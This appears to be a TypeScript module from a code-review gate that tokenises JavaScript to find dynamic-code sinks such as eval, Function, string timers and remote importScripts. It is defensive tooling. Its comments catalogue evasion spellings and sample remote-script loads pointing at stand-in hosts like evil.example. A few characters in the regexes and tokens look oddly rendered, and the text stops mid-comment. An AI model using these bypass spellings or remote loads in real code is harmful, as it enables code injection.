// SPDX-License-Identifier: AGPL-3.0-or-later
//
// TOKEN-LEVEL detection of dynamic-code sinks, replacing the regex family that
// preceded it.
//
// WHY THIS EXISTS. The question every dynamic-code gate has to answer is:
//
//     does some expression evaluate to a sink, and is it then INVOKED?
//
// A regex cannot ask that. It can only recognise particular spellings, and the
// spellings are unbounded — review of PR #169 found a new one on six
// consecutive rounds:
//
//     Function.call(…)          →  Function['call'](…)
//     eval.apply(…)             →  globalThis.Function?.call(…)
//     Reflect.apply(Function,…) →  Reflect['apply'](Function, …)
//     setTimeout.call(…)        →  setTimeout['call'](…)
//
// Each fix closed one spelling and left the class open, because "reference,
// then any chain of member accesses, then a call" is a STRUCTURAL property.
// So this module tokenises instead, and walks that chain. Adding a new access
// form to JavaScript is the only thing that could reopen it — a new way of
// SPELLING an existing one cannot, because the walk never enumerates
// spellings.
//
// (The obvious alternative — a real parser — is unavailable: `typescript@7`
// is the native port and exposes no `createSourceFile`, and this module is
// deliberately DEPENDENCY-FREE so the `scripts`-rooted vitest project, which
// resolves no external packages, can unit test it directly.)
//
// WHAT THE TOKENISER FIXES ON ITS OWN. Comments, strings, templates and regex
// literals are skipped as part of tokenising, so "doctrine discussed in prose"
// never reaches the walk and no separate comment-stripping pass is needed —
// which is what previously made a heuristic stripper load-bearing for
// detection.

/** A lexical token. `value` is the raw source text of the token. */
export interface Token {
  readonly kind: 'ident' | 'punct' | 'string' | 'template' | 'regex' | 'number';
  /**
   * For an identifier this is the DECODED name — JavaScript permits Unicode
   * escapes inside identifiers, so `\u0065val` IS `eval` and must compare equal
   * to it. For every other kind it is the raw source text.
   */
  readonly value: string;
  readonly start: number;
  /** Offset just past the token's RAW source text. */
  readonly end: number;
}

/**
 * Keywords after which a `/` begins a REGEX literal rather than a division.
 * After any other identifier the `/` divides.
 */
const KEYWORDS_BEFORE_REGEX: ReadonlySet<string> = new Set([
  'return',
  'typeof',
  'instanceof',
  'in',
  'of',
  'new',
  'delete',
  'void',
  'throw',
  'case',
  'do',
  'else',
  'yield',
  'await',
]);

const IDENT_START = /[A-Za-z_$-￿]/;
const IDENT_PART = /[A-Za-z0-9_$-￿]/;

/**
 * Decode a `\uXXXX` / `\u{X…}` escape at `i`, or return null.
 *
 * Identifier escapes are why this exists: `eval('x')` is a call to `eval`,
 * and a lexer treating the backslash as punctuation would compare the wrong
 * name and let it through.
 */
function readUnicodeEscape(source: string, i: number): { char: string; end: number } | null {
  if (source[i] !== '\\' || source[i + 1] !== 'u') return null;
  if (source[i + 2] === '{') {
    const close = source.indexOf('}', i + 3);
    if (close === -1) return null;
    const hex = source.slice(i + 3, close);
    if (!/^[0-9A-Fa-f]{1,6}$/.test(hex)) return null;
    return { char: String.fromCodePoint(Number.parseInt(hex, 16)), end: close + 1 };
  }
  const hex = source.slice(i + 2, i + 6);
  if (!/^[0-9A-Fa-f]{4}$/.test(hex)) return null;
  return { char: String.fromCharCode(Number.parseInt(hex, 16)), end: i + 6 };
}

/** Read an identifier (honouring escapes) at `i`; returns its DECODED name. */
function readIdentifier(source: string, i: number): { name: string; end: number } | null {
  let k = i;
  let name = '';
  while (k < source.length) {
    const decoded = readUnicodeEscape(source, k);
    const char = decoded ? decoded.char : (source[k] as string);
    const ok = name === '' ? IDENT_START.test(char) : IDENT_PART.test(char);
    if (!ok) break;
    name += char;
    k = decoded ? decoded.end : k + 1;
  }
  return name === '' ? null : { name, end: k };
}

/**
 * Lex `source` into tokens, discarding comments and whitespace.
 *
 * `preferRegex` resolves the ONE genuinely undecidable case for a lexer: after
 * `)`, `]`, `}` or a non-keyword identifier, `/` may open a regex
 * (`if (ok) /re/.test(x)`) or divide (`(a) / b`). Telling them apart needs a
 * parser. Callers scan BOTH settings and union the findings, so a wrong guess
 * can hide nothing: whichever way the real code goes, one of the two passes
 * lexes it correctly.
 */
export function tokenize(
  source: string,
  preferRegex = false,
  options: { readonly from?: number; readonly stopAtUnmatchedBrace?: boolean } = {},
): Token[] {
  const tokens: Token[] = [];
  const n = source.length;
  let i = options.from ?? 0;
  // Only meaningful with `stopAtUnmatchedBrace`: the depth of `{` … `}` pairs
  // seen so far, so the terminator of a template interpolation can be found
  // without lexing the rest of the file.
  let braceDepth = 0;

  /** The last token that can decide whether a `/` opens a regex. */
  const previous = (): Token | undefined => tokens[tokens.length - 1];

  const opensRegex = (): boolean => {
    const prev = previous();
    if (!prev) return true;
    if (prev.kind === 'ident') {
      return KEYWORDS_BEFORE_REGEX.has(prev.value) ? true : preferRegex;
    }
    // A value-producing token cannot be followed by a regex.
    if (prev.kind === 'string' || prev.kind === 'template' || prev.kind === 'number') {
      return false;
    }
    if (prev.kind === 'regex') return false;
    // Punctuation: `)`, `]`, `}` and the postfix operators end a value.
    if (prev.value === ')' || prev.value === ']' || prev.value === '}') return preferRegex;
    if (prev.value === '++' || prev.value === '--') return false;
    return true;
  };

  /** Consume a `'`/`"` string starting at `i`; returns the end offset. */
  const readQuoted = (quote: string): number => {
    let k = i + 1;
    while (k < n) {
      const c = source[k] as string;
      if (c === '\\') {
        k += 2;
        continue;
      }
      if (c === quote) return k + 1;
      // An unterminated literal must not swallow the rest of the file.
      if (c === '\n') return k;
      k += 1;
    }
    return n;
  };

  /** Consume a template literal (with `${…}` nesting) starting at `i`. */
  const readTemplate = (): number => {
    let k = i + 1;
    let depth = 0;
    while (k < n) {
      const c = source[k] as string;
      if (c === '\\') {
        k += 2;
        continue;
      }
      if (depth === 0 && c === '`') return k + 1;
      if (depth === 0 && c === '$' && source[k + 1] === '{') {
        depth = 1;
        k += 2;
        continue;
      }
      if (depth > 0) {
        // Inside `${…}`: track braces, and skip nested strings/templates so a
        // brace or backtick inside one cannot end the interpolation early.
        if (c === '{') depth += 1;
        else if (c === '}') depth -= 1;
        else if (c === '"' || c === "'") {
          const saved = i;
          i = k;
          k = readQuoted(c);
          i = saved;
          continue;
        } else if (c === '`') {
          const saved = i;
          i = k;
          k = readTemplate();
          i = saved;
          continue;
        }
      }
      k += 1;
    }
    return n;
  };

  /** Consume a regex literal starting at `i`; returns the end offset. */
  const readRegex = (): number => {
    let k = i + 1;
    let inClass = false;
    while (k < n) {
      const c = source[k] as string;
      if (c === '\\') {
        k += 2;
        continue;
      }
      if (c === '\n') return k; // unterminated
      if (c === '[') inClass = true;
      else if (c === ']') inClass = false;
      else if (c === '/' && !inClass) {
        k += 1;
        while (k < n && IDENT_PART.test(source[k] as string)) k += 1; // flags
        return k;
      }
      k += 1;
    }
    return n;
  };

  while (i < n) {
    const c = source[i] as string;

    if (c === ' ' || c === '\t' || c === '\r' || c === '\n' || c === '\f' || c === '\v') {
      i += 1;
      continue;
    }
    // Comments are DISCARDED here, which is why no separate strip pass is
    // needed for detection: prose can never reach the walk.
    if (c === '/' && source[i + 1] === '/') {
      const nl = source.indexOf('\n', i);
      i = nl === -1 ? n : nl;
      continue;
    }
    if (c === '/' && source[i + 1] === '*') {
      const close = source.indexOf('*/', i + 2);
      i = close === -1 ? n : close + 2;
      continue;
    }
    if (c === '"' || c === "'") {
      const end = readQuoted(c);
      tokens.push({ kind: 'string', value: source.slice(i, end), start: i, end });
      i = end;
      continue;
    }
    if (c === '`') {
      const end = readTemplate();
      tokens.push({ kind: 'template', value: source.slice(i, end), start: i, end });
      i = end;
      continue;
    }
    if (c === '/' && opensRegex()) {
      const end = readRegex();
      tokens.push({ kind: 'regex', value: source.slice(i, end), start: i, end });
      i = end;
      continue;
    }
    const identifier = readIdentifier(source, i);
    if (identifier) {
      tokens.push({ kind: 'ident', value: identifier.name, start: i, end: identifier.end });
      i = identifier.end;
      continue;
    }
    if (/[0-9]/.test(c)) {
      let k = i;
      while (k < n && /[0-9a-fA-FxXoObBeE._n]/.test(source[k] as string)) k += 1;
      tokens.push({ kind: 'number', value: source.slice(i, k), start: i, end: k });
      i = k;
      continue;
    }
    // Punctuation. Only the multi-character forms the walk cares about need to
    // be lexed as single tokens.
    const three = source.slice(i, i + 3);
    const two = source.slice(i, i + 2);
    if (three === '**=' || three === '...' || three === '===' || three === '!==') {
      tokens.push({ kind: 'punct', value: three, start: i, end: i + 3 });
      i += 3;
      continue;
    }
    if (two === '?.' || two === '++' || two === '--' || two === '=>' || two === '?？') {
      tokens.push({ kind: 'punct', value: two, start: i, end: i + 2 });
      i += 2;
      continue;
    }
    if (options.stopAtUnmatchedBrace && (c === '{' || c === '}')) {
      if (c === '}' && braceDepth === 0) {
        // The interpolation's terminator. Pushed so the caller can read its
        // offset, then the scan stops — this is what keeps span-finding linear.
        tokens.push({ kind: 'punct', value: c, start: i, end: i + 1 });
        return tokens;
      }
      braceDepth += c === '{' ? 1 : -1;
    }
    tokens.push({ kind: 'punct', value: c, start: i, end: i + 1 });
    i += 1;
  }
  return tokens;
}

/** Is `t` the punctuation `value`? */
const isPunct = (t: Token | undefined, value: string): boolean =>
  t?.kind === 'punct' && t.value === value;

/** Decode the escape sequences inside a string/template BODY. */
function decodeStringBody(body: string): string {
  let out = '';
  let i = 0;
  const SIMPLE: Record<string, string> = {
    n: '\n',
    t: '\t',
    r: '\r',
    b: '\b',
    f: '\f',
    v: '\v',
    '0': '\0',
  };
  while (i < body.length) {
    if (body[i] !== '\\') {
      out += body[i];
      i += 1;
      continue;
    }
    const decoded = readUnicodeEscape(body, i);
    if (decoded) {
      out += decoded.char;
      i = decoded.end;
      continue;
    }
    const hex = /^x([0-9A-Fa-f]{2})/.exec(body.slice(i + 1));
    if (hex?.[1]) {
      out += String.fromCharCode(Number.parseInt(hex[1], 16));
      i += 1 + hex[0].length;
      continue;
    }
    const next = body[i + 1] ?? '';
    // A LINE CONTINUATION — a backslash immediately before a line terminator —
    // contributes NOTHING to the string. `'https:\<newline>//evil/x.js'` is
    // the single URL `https://evil/x.js` at runtime, so keeping the newline
    // would stop the remote scheme from being recognised.
    if (next === '\n' || next === '\u2028' || next === '\u2029') {
      i += 2;
      continue;
    }
    if (next === '\r') {
      i += body[i + 2] === '\n' ? 3 : 2;
      continue;
    }
    out += SIMPLE[next] ?? next;
    i += 2;
  }
  return out;
}

/**
 * The decoded content of a string token, or `null` when it is not a string.
 *
 * A template WITH interpolations has no single value, so this returns null for
 * it — callers that only need the static head use {@link stringPrefix}.
 */
export function stringValue(t: Token | undefined): string | null {
  if (!t) return null;
  if (t.kind === 'string') return decodeStringBody(t.value.slice(1, -1));
  // A template with no substitution is a string literal for our purposes.
  if (t.kind === 'template' && !t.value.includes('${')) {
    return decodeStringBody(t.value.slice(1, -1));
  }
  return null;
}

/** Is this token a STRING VALUE — a quoted literal or ANY template literal? */
export function isStringToken(t: Token | undefined): boolean {
  return t?.kind === 'string' || t?.kind === 'template';
}

/**
 * The STATIC leading text of a string token: a whole quoted literal, or a
 * template's head up to its first interpolation.
 *
 * `\`https://evil.example/${name}.js\`` is still a remote URL — the scheme and
 * host are fixed and only the path varies — so a check that rejected every
 * interpolated template would miss it.
 */
export function stringPrefix(t: Token | undefined): string | null {
  if (!t) return null;
  if (t.kind === 'string') return decodeStringBody(t.value.slice(1, -1));
  if (t.kind !== 'template') return null;
  const body = t.value.slice(1, t.value.endsWith('`') ? -1 : undefined);
  const interpolation = body.indexOf('${');
  return decodeStringBody(interpolation === -1 ? body : body.slice(0, interpolation));
}

/**
 * The value of a constant STRING EXPRESSION — a `+` chain over string and
 * template literals and parenthesised sub-expressions.
 *
 * Every predicate below used to read only `arg[0]`, which made concatenation a
 * universal bypass: `importScripts('ht' + 'tps://evil/x.js')` loads exactly the
 * same cross-origin script as the whole literal, and `globalThis['ev' + 'al']`
 * reaches exactly the same sink as `globalThis['eval']`. Whether the pieces are
 * written apart or together is a SPELLING, so it is folded once, here, and
 * every caller shares the result.
 *
 * `prefix` is the longest statically-known LEADING text — folding stops at the
 * first operand whose value is unknown (an identifier, a call, a template
 * interpolation), because everything after it could be anything. `complete`
 * says nothing was elided, which is what a whole-value comparison needs.
 * `isString` says the expression evaluates to a string at all: JavaScript `+`
 * yields a string whenever either operand is one, so a single string anywhere
 * in the chain is enough — that is what makes `setTimeout(prefix + 'evil()')`
 * the implicit-eval form even though it does not begin with a literal.
 */
interface FoldedString {
  readonly prefix: string;
  readonly complete: boolean;
  readonly isString: boolean;
}

/** Split `tokens` on top-level `+`, ignoring `+` inside any bracket group. */
function additionOperands(tokens: readonly Token[]): Token[][] {
  const operands: Token[][] = [];
  let current: Token[] = [];
  let depth = 0;
  for (const t of tokens) {
    if (t.kind === 'punct') {
      if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
      else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
      else if (t.value === '+' && depth === 0) {
        operands.push(current);
        current = [];
        continue;
      }
    }
    current.push(t);
  }
  operands.push(current);
  return operands;
}

function foldString(tokens: readonly Token[], depth = 0): FoldedString {
  if (tokens.length === 0 || depth > 16) return { prefix: '', complete: false, isString: false };
  const operands = additionOperands(tokens);

  let prefix = '';
  let complete = true;
  let isString = false;
  for (const operand of operands) {
    // A fully parenthesised operand is the same expression one level in.
    const inner =
      operand.length > 1 && isPunct(operand[0], '(') && matchGroup(operand, 0) === operand.length
        ? foldString(operand.slice(1, -1), depth + 1)
        : null;
    const part =
      inner ??
      (operand.length === 1 && isStringToken(operand[0])
        ? {
            prefix: stringPrefix(operand[0]) ?? '',
            complete: stringValue(operand[0]) !== null,
            isString: true,
          }
        : { prefix: '', complete: false, isString: false });

    if (part.isString) isString = true;
    if (complete) prefix += part.prefix;
    if (!part.complete) complete = false;
  }
  return { prefix, complete, isString };
}

/** Global objects through which a sink can be reached by property access. */
const GLOBAL_RECEIVERS: ReadonlySet<string> = new Set(['globalThis', 'window', 'self']);

/**
 * The property name inside a computed access `[ … ]` opened at `open`, or null.
 * The subscript is FOLDED, so `['ev' + 'al']` names `eval`.
 */
function computedName(
  tokens: readonly Token[],
  open: number,
): { name: string; next: number } | null {
  const end = matchGroup(tokens, open);
  if (end === -1) return null;
  const folded = foldString(tokens.slice(open + 1, end - 1));
  if (!folded.complete || !folded.isString) return null;
  return { name: folded.prefix, next: end };
}

/**
 * Read a member access at `i` — `.name`, `?.name`, `['name']`, `?.['name']`.
 * Returns the accessed name and the index after it, or `null`.
 */
function readMember(tokens: readonly Token[], i: number): { name: string; next: number } | null {
  let k = i;
  if (isPunct(tokens[k], '?.')) k += 1;
  else if (isPunct(tokens[k], '.')) k += 1;
  else if (isPunct(tokens[k], '[')) return computedName(tokens, k);
  else return null;

  if (isPunct(tokens[k], '[')) return computedName(tokens, k);
  const t = tokens[k];
  if (t?.kind === 'ident') return { name: t.value, next: k + 1 };
  return null;
}

/**
 * Does `token` end an expression, so that a following `.`/`?.`/`[` is a MEMBER
 * ACCESS on it rather than the start of something new?
 *
 * `}` counts: `const f = function(){}.constructor('code')` is a member access
 * on a function expression.
 */
function endsExpression(token: Token | undefined): boolean {
  if (!token) return false;
  if (token.kind === 'punct')
    return token.value === ')' || token.value === ']' || token.value === '}';
  return true;
}

/**
 * Skip the parentheses wrapping a reference expression at `i`, returning the
 * index where the reference itself starts.
 *
 * `(Function)` is `Function`, `((Function))` is `Function`, and a SEQUENCE
 * expression `(0, Function)` evaluates to its LAST operand — so all three are
 * the same reference with punctuation around it. The scan loop already knew
 * this about a reference in call position; every place that resolves a
 * reference from an INITIALIZER or an ARGUMENT resolved it from the `(`
 * instead, where no identifier is found. One helper, applied at each of them,
 * keeps the four sites from drifting apart again.
 */
function unwrapReference(tokens: readonly Token[], i: number): number {
  let k = i;
  for (let steps = 0; steps < 16; steps += 1) {
    if (!isPunct(tokens[k], '(')) return k;
    const end = matchGroup(tokens, k);
    if (end === -1) return k;
    let last = k + 1;
    let depth = 0;
    for (let j = k + 1; j < end - 1; j += 1) {
      const t = tokens[j];
      if (t?.kind !== 'punct') continue;
      if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
      else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
      else if (t.value === ',' && depth === 0) last = j + 1;
    }
    k = last;
  }
  return k;
}

/** Index just past the group opened at `open` (`(`, `[` or `{`), or -1. */
function matchGroup(tokens: readonly Token[], open: number): number {
  const pairs: Record<string, string> = { '(': ')', '[': ']', '{': '}' };
  const openTok = tokens[open];
  if (openTok?.kind !== 'punct') return -1;
  const close = pairs[openTok.value];
  if (!close) return -1;
  let depth = 0;
  for (let k = open; k < tokens.length; k += 1) {
    const t = tokens[k];
    if (t?.kind !== 'punct') continue;
    if (t.value === openTok.value) depth += 1;
    else if (t.value === close) {
      depth -= 1;
      if (depth === 0) return k + 1;
    }
  }
  return -1;
}

/**
 * Split the argument list of the call opened at `open` into per-argument token
 * runs, at top level only.
 */
function callArguments(tokens: readonly Token[], open: number): Token[][] {
  const end = matchGroup(tokens, open);
  if (end === -1) return [];
  const args: Token[][] = [];
  let current: Token[] = [];
  let depth = 0;
  for (let k = open + 1; k < end - 1; k += 1) {
    const t = tokens[k] as Token;
    if (t.kind === 'punct') {
      if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
      else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
      else if (t.value === ',' && depth === 0) {
        args.push(current);
        current = [];
        continue;
      }
    }
    current.push(t);
  }
  if (current.length > 0) args.push(current);
  return args;
}

/** How a sink's arguments are judged once an invocation is found. */
export interface SinkSpec {
  /** The identifier that names the sink (`eval`, `Function`, `setTimeout`, …). */
  readonly name: string;
  /** Human label the gates wrap in their own phrasing. */
  readonly label: string;
  /**
   * Predicate on the CODE argument. Omitted ⇒ any invocation is a sink
   * (`eval`/`Function` evaluate whatever they are given). Supplied ⇒ the
   * argument must satisfy it, which is how `setTimeout(fn, 0)` stays clean
   * while `setTimeout('code', 0)` does not.
   */
  readonly codeArgument?: (arg: readonly Token[]) => boolean;
  /**
   * The sink takes an UNBOUNDED list of code arguments, so `codeArgument` is
   * tested against EVERY one of them and any match fires.
   *
   * `importScripts` is the case: it loads each URL it is given, so
   * `importScripts('/local.js', 'https://evil.example/x.js')` fetches remote
   * code even though its first argument is same-origin. Judging only the first
   * argument was a REGRESSION against the whole-call text scan this module
   * replaced — the one thing the structural rewrite was not allowed to lose.
   */
  readonly variadic?: boolean;
}

/**
 * The code argument is a STRING — the implicit-eval timer form.
 *
 * An INTERPOLATED template counts: `setTimeout(\`evil(${v})\`, 0)` is still a
 * string the host compiles, so requiring a fully static literal would miss the
 * form an attacker is most likely to use.
 */
export const isStringLiteral = (arg: readonly Token[]): boolean => foldString(arg).isString;

/** The code argument is a string whose STATIC prefix names a REMOTE script. */
export const isRemoteUrl = (arg: readonly Token[]): boolean => {
  const { prefix, isString } = foldString(arg);
  return isString && (/^https?:\/\//i.test(prefix) || prefix.startsWith('//'));
};

/**
 * The `${…}` interpolation bodies of a template literal, with the absolute
 * offset of each. Nested templates, strings and braces are skipped so a `}`
 * inside one cannot end the span early.
 */
/**
 * The `${…}` interpolation bodies of a template literal, with the absolute
 * offset of each.
 *
 * The matching `}` is found by TOKENISING the span, not by counting braces:
 * a hand-rolled counter is a second, weaker lexer, and it read the `}` inside
 * a regex literal (`${/}/.test(x); eval(p)}`) as the end of the span. Reusing
 * the one tokeniser means regex literals, strings, templates and comments are
 * all handled by the code that already gets them right.
 */
function interpolationSpans(
  raw: string,
  base: number,
  preferRegex: boolean,
): Array<{ text: string; offset: number }> {
  const spans: Array<{ text: string; offset: number }> = [];
  let i = 1; // past the opening backtick
  while (i < raw.length) {
    if (raw[i] === '\\') {
      i += 2;
      continue;
    }
    if (raw[i] === '`') break; // the template's own closing backtick
    if (raw[i] === '$' && raw[i + 1] === '{') {
      const start = i + 2;
      // Lex FROM `start` and stop at the terminator, rather than slicing and
      // re-lexing the whole remaining template for every interpolation — that
      // was O(n²) in the number of spans, which the performance canary caught.
      const tokens = tokenize(raw, preferRegex, { from: start, stopAtUnmatchedBrace: true });
      const last = tokens[tokens.length - 1];
      const end = last && last.kind === 'punct' && last.value === '}' ? last.start : raw.length; // unterminated: take the rest
      spans.push({ text: raw.slice(start, end), offset: base + start });
      i = end + 1;
      continue;
    }
    i += 1;
  }
  return spans;
}

export interface SinkFinding {
  readonly label: string;
  readonly line: number;
  /** Source text of the invocation, for the gate's message. */
  readonly text: string;
}

/**
 * The argument runs a sink's code predicate must be tested against.
 *
 * `position` says where the code starts and whether it arrives inside an array
 * (the `.apply` / `Reflect.apply` form). A VARIADIC sink is tested against
 * every argument from that point on — `importScripts` loads each URL it is
 * handed, so judging only the first would clear
 * `importScripts('/local.js', 'https://evil.example/x.js')`.
 */
function codeArguments(
  args: readonly Token[][],
  position: { index: number; inArray: boolean },
  variadic: boolean,
): Token[][] {
  if (position.inArray) {
    const array = args[position.index] ?? [];
    if (!isPunct(array[0], '[')) return [];
    // `['code', …]` — the elements are split out the same way a call's
    // arguments are, so later elements and the closing bracket never remain
    // attached to the one being judged.
    const elements = callArguments(array, 0);
    return variadic ? elements : [elements[0] ?? []];
  }
  const rest = args.slice(position.index);
  return variadic ? rest : [rest[0] ?? []];
}

/**
 * Which argument carries the code, given the inherited method the sink was
 * invoked through. `null` ⇒ the method is not an invocation of the sink at all
 * (`Function.toString()` is not a sink), so the walk stops.
 */
function codeArgumentIndex(method: string | undefined): { index: number; inArray: boolean } | null {
  if (method === undefined) return { index: 0, inArray: false };
  if (method === 'call' || method === 'bind') return { index: 1, inArray: false };
  if (method === 'apply') return { index: 1, inArray: true };
  return null;
}

/**
 * Find dynamic-code sink INVOCATIONS in `source`.
 *
 * Both lexings of the ambiguous `/` are analysed and the results unioned, so a
 * lexer guess can never hide a call — see {@link tokenize}.
 */
export function findSinkInvocations(source: string, specs: readonly SinkSpec[]): SinkFinding[] {
  const byKey = new Map<string, SinkFinding>();
  const lineStarts: number[] = [0];
  for (let k = 0; k < source.length; k += 1) if (source[k] === '\n') lineStarts.push(k + 1);
  const lineOf = (offset: number): number => {
    let lo = 0;
    let hi = lineStarts.length - 1;
    while (lo < hi) {
      const mid = (lo + hi + 1) >> 1;
      if ((lineStarts[mid] as number) <= offset) lo = mid;
      else hi = mid - 1;
    }
    return lo + 1;
  };

  /**
   * Analyse a token stream, then RECURSE into every template interpolation it
   * contains.
   *
   * A template's `${…}` spans are EXECUTABLE CODE, not text. The literal stays
   * one token so a tag call and a string argument still read correctly, and
   * each span is analysed in its own right with offsets shifted back onto the
   * original source so reported lines stay true. The recursion is what makes
   * a NESTED interpolation work, which a single extra pass would have missed.
   */
  const visit = (tokens: readonly Token[], preferRegex: boolean, depth: number): void => {
    for (const found of analyse(tokens, specs, source, lineOf)) {
      byKey.set(`${found.line}:${found.label}:${found.text}`, found);
    }
    if (depth >= 16) return; // real code never nests templates this deep
    for (const token of tokens) {
      if (token.kind !== 'template') continue;
      for (const span of interpolationSpans(token.value, token.start, preferRegex)) {
        const inner = tokenize(span.text, preferRegex).map((t) => ({
          ...t,
          start: t.start + span.offset,
          end: t.end + span.offset,
        }));
        visit(inner, preferRegex, depth + 1);
      }
    }
  };

  for (const preferRegex of [false, true]) visit(tokenize(source, preferRegex), preferRegex, 0);
  return [...byKey.values()].sort((a, b) => a.line - b.line || a.label.localeCompare(b.label));
}

/**
 * Every local name through which a sink can be reached.
 *
 * `direct` holds `NAME → sink` (`const F = Function`). `members` holds
 * `OBJECT → property → sink`, which is what makes an object a RECEIVER —
 * exactly the relationship `globalThis`/`window`/`self` already had, so a
 * user-defined `const o = { run: eval }` is resolved by the same lookup rather
 * than by a second mechanism.
 */
interface AliasTable {
  readonly direct: Map<string, SinkSpec>;
  readonly members: Map<string, Map<string, SinkSpec>>;
}

/**
 * Names bound to a sink, so `const F = Function; F('x')()` is caught.
 *
 * Deliberately flow-INSENSITIVE: a binding is recognised wherever it is
 * written and treated as holding for the whole file, iterating to a fixpoint
 * so an alias of an alias resolves too. Three binding FORMS are read, because
 * they are three spellings of one act — giving a sink a second name:
 *
 *     const F = Function                  → direct
 *     const { eval: run } = globalThis    → direct, via a receiver's property
 *     const o = { run: eval }             → member, making `o` a receiver
 *
 * What it still does NOT do, stated plainly rather than implied: a sink stored
 * in an ARRAY element or reached through one, reassignment (the last binding
 * seen wins), and anything needing real scope analysis — a shadowed name in an
 * inner block is treated as the outer one. Those need data flow, not lexing;
 * erring toward reporting is the safe direction for a gate. The CSP remains
 * the runtime half in the browser; in `apps/api`, where there is none, this is
 * the reachable-spelling half.
 */
/**
 * The index of a declaration's INITIALIZER, given the declared name at
 * `nameIndex`, or null when there is no `=`.
 *
 * A TypeScript annotation sits between the two — `const F: FunctionConstructor
 * = Function` — so requiring `=` immediately after the name missed every typed
 * alias, which in a TypeScript-first repository is the normal way to write one.
 * `=>` and `===` lex as their own tokens, so neither can be mistaken for the
 * assignment.
 */
function initializerIndex(tokens: readonly Token[], nameIndex: number): number | null {
  let k = nameIndex + 1;
  if (isPunct(tokens[k], '=')) return k + 1;
  if (!isPunct(tokens[k], ':')) return null;
  let depth = 0;
  for (let steps = 0; steps < 64 && k < tokens.length; steps += 1, k += 1) {
    const t = tokens[k];
    if (t?.kind !== 'punct') continue;
    if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
    else if (t.value === ')' || t.value === ']' || t.value === '}') {
      if (depth === 0) return null;
      depth -= 1;
    } else if (depth === 0 && t.value === ';') return null;
    else if (depth === 0 && t.value === '=') return k + 1;
  }
  return null;
}

/**
 * The `key` / `key: value` entries of the brace group opened at `open`, at its
 * top level only. Serves both an object LITERAL and a destructuring PATTERN,
 * which share this shape.
 */
function braceEntries(
  tokens: readonly Token[],
  open: number,
): {
  entries: Array<{ key: string; valueIndex: number; shorthand: boolean }>;
  next: number;
} | null {
  const end = matchGroup(tokens, open);
  if (end === -1) return null;
  const entries: Array<{ key: string; valueIndex: number; shorthand: boolean }> = [];
  let k = open + 1;
  while (k < end - 1) {
    const keyToken = tokens[k];
    let key: string | null = null;
    if (keyToken?.kind === 'ident') key = keyToken.value;
    else if (isStringToken(keyToken)) key = stringValue(keyToken);
    else if (isPunct(keyToken, '[')) {
      // A computed key — `{ ['ev' + 'al']: run }` — folds like any subscript.
      const computed = computedName(tokens, k);
      if (computed) {
        key = computed.name;
        k = computed.next - 1;
      }
    }
    if (key === null) {
      // Anything unrecognised (a spread, a method, a nested pattern): skip to
      // the next top-level comma rather than mis-pairing the entries after it.
      let depth = 0;
      while (k < end - 1) {
        const t = tokens[k];
        if (t?.kind === 'punct') {
          if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
          else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
          else if (t.value === ',' && depth === 0) break;
        }
        k += 1;
      }
      k += 1;
      continue;
    }
    k += 1;
    const shorthand = !isPunct(tokens[k], ':');
    const valueIndex = shorthand ? k - 1 : k + 1;
    entries.push({ key, valueIndex, shorthand });
    // Advance past this entry's value to the next top-level comma.
    let depth = 0;
    while (k < end - 1) {
      const t = tokens[k];
      if (t?.kind === 'punct') {
        if (t.value === '(' || t.value === '[' || t.value === '{') depth += 1;
        else if (t.value === ')' || t.value === ']' || t.value === '}') depth -= 1;
        else if (t.value === ',' && depth === 0) break;
      }
      k += 1;
    }
    k += 1;
  }
  return { entries, next: end };
}

function collectAliases(
  tokens: readonly Token[],
  specByName: ReadonlyMap<string, SinkSpec>,
  resolve: (i: number, aliases: AliasTable) => SinkSpec | null,
): AliasTable {
  const aliases: AliasTable = { direct: new Map(), members: new Map() };

  /** The sink table a receiver expression at `i` exposes, if it is one. */
  const receiverAt = (i: number): ReadonlyMap<string, SinkSpec> | null => {
    const t = tokens[i];
    if (t?.kind !== 'ident') return null;
    if (GLOBAL_RECEIVERS.has(t.value)) return specByName;
    return aliases.members.get(t.value) ?? null;
  };

  // A fixpoint: each pass can bind a name to a sink that the previous pass
  // only just learned about. Bounded because every pass either adds a binding
  // or stops.
  for (let pass = 0; pass < 8; pass += 1) {
    const before = aliases.direct.size + aliases.members.size;

    for (let i = 0; i + 2 < tokens.length; i += 1) {
      // `const { eval: run } = globalThis` — a destructuring PATTERN, whose
      // properties are read out of the receiver on the right.
      if (isPunct(tokens[i], '{')) {
        const group = braceEntries(tokens, i);
        if (group && isPunct(tokens[group.next], '=')) {
          const table = receiverAt(unwrapReference(tokens, group.next + 1));
          if (table) {
            for (const entry of group.entries) {
              const spec = table.get(entry.key);
              const local = tokens[entry.valueIndex];
              if (spec && local?.kind === 'ident') aliases.direct.set(local.value, spec);
            }
          }
        }
        continue;
      }

      const name = tokens[i];
      if (name?.kind !== 'ident' || specByName.has(name.value)) continue;
      const previous = tokens[i - 1];
      if (isPunct(previous, '.') || isPunct(previous, '?.')) continue;
      const declared = initializerIndex(tokens, i);
      if (declared === null) continue;
      // `(Function)`, `(0, Function)`, `({ run: eval })` — punctuation around
      // the initializer, not a different initializer.
      const initializer = unwrapReference(tokens, declared);

      // `const o = { run: eval }` — an object LITERAL holding sinks makes `o`
      // a receiver, resolved by the same lookup as `globalThis`.
      if (isPunct(tokens[initializer], '{')) {
        const group = braceEntries(tokens, initializer);
        if (!group) continue;
        const table = new Map<string, SinkSpec>();
        for (const entry of group.entries) {
          const spec = resolve(unwrapReference(tokens, entry.valueIndex), aliases);
          if (spec) table.set(entry.key, spec);
        }
        if (table.size > 0) aliases.members.set(name.value, table);
        continue;
      }

      const spec = resolve(initializer, aliases);
      if (spec) aliases.direct.set(name.value, spec);
    }

    if (aliases.direct.size + aliases.members.size === before) break;
  }
  return aliases;
}

function analyse(
  tokens: readonly Token[],
  specs: readonly SinkSpec[],
  source: string,
  lineOf: (offset: number) => number,
): SinkFinding[] {
  const out: SinkFinding[] = [];
  const specByName = new Map(specs.map((s) => [s.name, s]));

  /**
   * If a sink REFERENCE starts at `i`, return it and the index just past it.
   * Covers the bare identifier and the global-object forms; the parenthesized
